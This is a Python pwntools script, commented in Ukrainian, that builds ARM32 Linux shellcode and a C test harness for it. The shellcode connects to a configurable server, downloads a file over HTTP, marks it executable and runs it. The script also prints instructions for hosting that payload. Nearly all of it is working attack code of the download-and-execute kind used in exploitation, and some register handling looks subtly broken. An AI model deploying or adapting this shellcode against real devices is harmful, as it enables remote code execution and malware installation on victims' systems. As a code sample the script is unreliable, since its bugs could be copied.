#!/usr/bin/env python3
from pwn import *

context.arch = 'arm'
context.bits = 32
context.os = 'linux'
context.endian = 'little'

# Налаштовувані параметри
SERVER_IP = "127.0.0.1"  # Замініть на IP вашого сервера
SERVER_PORT = 4444       # Замініть на порт вашого сервера
FILENAME = "payload"     # Ім'я файлу, який буде завантажено з сервера

# Конвертація IP у формат для використання в коді
ip_bytes = bytes(map(int, SERVER_IP.split('.')))
ip_asm = ', '.join(f'0x{b:02x}' for b in ip_bytes)

# Конвертація порту в Network Byte Order (Big-Endian для порту)
port_hex = struct.pack(">H", SERVER_PORT).hex()

# Створюємо шелкод для підключення до сервера, завантаження і запуску файлу
assembly = f"""
.arm

/* socket(2, 1, 0) */
mov r0, #2          /* AF_INET */
mov r1, #1          /* SOCK_STREAM */
mov r2, #0          /* IPPROTO_IP */
mov r7, #281        /* socket syscall для ARM */
svc #0
mov r4, r0          /* r4 = sockfd */

/* connect(sockfd, &sockaddr, 16) */
adr r1, sockaddr    /* r1 = адреса sockaddr */
mov r2, #16         /* r2 = розмір sockaddr */
mov r7, #283        /* connect syscall */
svc #0
cmp r0, #0          /* Перевіряємо, чи успішне підключення */
bne exit            /* Якщо помилка, виходимо */

/* Запитуємо файл з сервера */
mov r0, r4          /* r0 = sockfd */
adr r1, request     /* r1 = рядок запиту */
mov r2, request_len /* r2 = довжина запиту */
mov r7, #4          /* write syscall */
svc #0

/* open() для створення файлу */
adr r0, filename    /* r0 = ім'я файлу */
mov r1, #0x42       /* r1 = O_CREAT | O_RDWR */
mov r2, #0x1ff      /* r2 = 0777 (права доступу) */
mov r7, #5          /* open syscall */
svc #0
mov r5, r0          /* r5 = filefd */

/* recv() і write() в циклі - завантажуємо файл */
mov r8, #0          /* r8 = флаг, чи заголовки пропущені (0 - ні, 1 - так) */

read_loop:
    /* read від серверу */
    mov r0, r4          /* r0 = sockfd */
    adr r1, buffer      /* r1 = буфер */
    mov r2, #1024       /* r2 = розмір буферу */
    mov r7, #3          /* read syscall */
    svc #0
    
    cmp r0, #0          /* Якщо прочитано 0 байт або помилка */
    ble close_file      /* перейти до закриття файлу */
    
    mov r6, r0          /* r6 = кількість прочитаних байт */
    
    cmp r8, #1          /* Перевіряємо, чи заголовки вже пропущені */
    beq write_to_file   /* Якщо так, записуємо весь буфер */
    
    /* Шукаємо "\r\n\r\n" у буфері */
    adr r3, buffer      /* r3 = початок буфера */
    mov r9, #0          /* r9 = індекс у буфері */
find_headers_end:
    cmp r9, r6          /* Якщо досягли кінця буфера */
    bge write_nothing   /* Нічого не пишемо, читаємо далі */
    
    ldrb r10, [r3, r9]  /* Завантажуємо байт */
    cmp r10, #0x0d      /* Перевіряємо, чи це '\r' */
    bne next_byte
    
    add r11, r9, #1
    cmp r11, r6
    bge write_nothing
    ldrb r10, [r3, r11]
    cmp r10, #0x0a      /* Перевіряємо, чи це '\n' */
    bne next_byte
    
    add r11, r9, #2
    cmp r11, r6
    bge write_nothing
    ldrb r10, [r3, r11]
    cmp r10, #0x0d      /* Перевіряємо, чи це '\r' */
    bne next_byte
    
    add r11, r9, #3
    cmp r11, r6
    bge write_nothing
    ldrb r10, [r3, r11]
    cmp r10, #0x0a      /* Перевіряємо, чи це '\n' */
    bne next_byte
    
    /* Знайдено "\r\n\r\n" */
    add r9, r9, #4      /* Пропускаємо "\r\n\r\n" */
    mov r8, #1          /* Встановлюємо флаг, що заголовки пропущені */
    
    /* Обчислюємо кількість байт для запису */
    sub r2, r6, r9      /* r2 = r6 - r9 (кількість байт після заголовків) */
    add r1, r3, r9      /* r1 = buffer + r9 (адреса початку даних) */
    b write_to_file
    
next_byte:
    add r9, r9, #1
    b find_headers_end

write_nothing:
    b read_loop         /* Читаємо далі, якщо не знайдено */

write_to_file:
    /* write до файлу */
    mov r0, r5          /* r0 = filefd */
    /* r1 уже вказує на адресу для запису */
    /* r2 уже містить кількість байт для запису */
    mov r7, #4          /* write syscall */
    svc #0
    
    b read_loop         /* Повторюємо цикл */

close_file:
    /* close() файлу */
    mov r0, r5          /* r0 = filefd */
    mov r7, #6          /* close syscall */
    svc #0
    
    /* close() сокета */
    mov r0, r4          /* r0 = sockfd */
    mov r7, #6          /* close syscall */
    svc #0

/* chmod для встановлення прав на виконання */
adr r0, filename    /* r0 = ім'я файлу */
mov r1, #0x1ff      /* r1 = 0777 (rwx для всіх) */
mov r7, #15         /* chmod syscall */
svc #0

/* execve() для запуску завантаженого файлу */
adr r0, filename    /* r0 = ім'я файлу */
mov r1, #0          /* r1 = NULL (немає аргументів) */
mov r2, #0          /* r2 = NULL (немає змінних середовища) */
mov r7, #11         /* execve syscall */
svc #0

exit:
    /* exit(0) */
    mov r0, #0          /* exit status */
    mov r7, #1          /* exit syscall */
    svc #0

/* Дані */
sockaddr:
    .short 2                 /* AF_INET (family) */
    .byte 0x{port_hex[0:2]}  /* перший байт порту */
    .byte 0x{port_hex[2:4]}  /* другий байт порту */
    .byte {ip_asm}           /* IP адреса */
    .byte 0, 0, 0, 0, 0, 0, 0, 0  /* padding */

filename:
    .asciz "{FILENAME}"

request:
    .ascii "GET /{FILENAME} HTTP/1.0\\r\\nConnection: close\\r\\n\\r\\n"
request_len = . - request

/* Буфер для даних */
buffer:
    .space 1024
"""

# Компілюємо шелкод
shellcode = asm(assembly)

# Виводимо результат
print("Download and Execute Shellcode для ARM32:")
print("\nДовжина shellcode: {} байт".format(len(shellcode)))
print("\nУ шістнадцятковому форматі:")
print("\\x" + "\\x".join("{:02x}".format(c) for c in shellcode))

# Створюємо тестовий C-файл
shellcode_hex = "\\x" + "\\x".join("{:02x}".format(c) for c in shellcode)
c_code = """
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

int main() {
    // Shellcode для завантаження і запуску файлу
    unsigned char shellcode[] = "%s";

    printf("Довжина shellcode: %%zu байт\\n", sizeof(shellcode) - 1);
    printf("Спроба підключення до %s:%d та завантаження файлу %s...\\n", 
           "%s", %d, "%s");

    // Виділяємо пам'ять з правами на виконання
    void *mem = mmap(NULL, sizeof(shellcode),
                     PROT_READ | PROT_WRITE | PROT_EXEC,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    if (mem == MAP_FAILED) {
        perror("mmap");
        return 1;
    }

    // Копіюємо shellcode у виділену пам'ять
    memcpy(mem, shellcode, sizeof(shellcode));

    printf("Виконання shellcode...\\n");

    // Виконуємо shellcode
    ((void(*)())mem)();

    // Звільняємо пам'ять (до цього рядка ми не дійдемо, якщо execve успішний)
    munmap(mem, sizeof(shellcode));

    return 0;
}
""" % (shellcode_hex, SERVER_IP, SERVER_PORT, FILENAME, SERVER_IP, SERVER_PORT, FILENAME)

# Записуємо C код у файл
with open("download_execute.c", "w") as f:
    f.write(c_code)

print("\nСтворено файл download_execute.c для тестування shellcode")
print("Компілюйте його за допомогою:")
print("arm-linux-gnueabihf-gcc -o download_execute download_execute.c")
print("qemu-arm -L /usr/arm-linux-gnueabihf ./download_execute")

# Інструкції з налаштування сервера для тестування
print("\nДля тестування потрібно налаштувати HTTP сервер:")
print(f"1. На машині з IP {SERVER_IP} в директорії з файлом {FILENAME}:")
print(f"   python3 -m http.server {SERVER_PORT}")
print(f"2. Переконайтесь, що {FILENAME} має права на виконання")
print(f"3. Запустіть шеллкод, який завантажить і виконає {FILENAME}")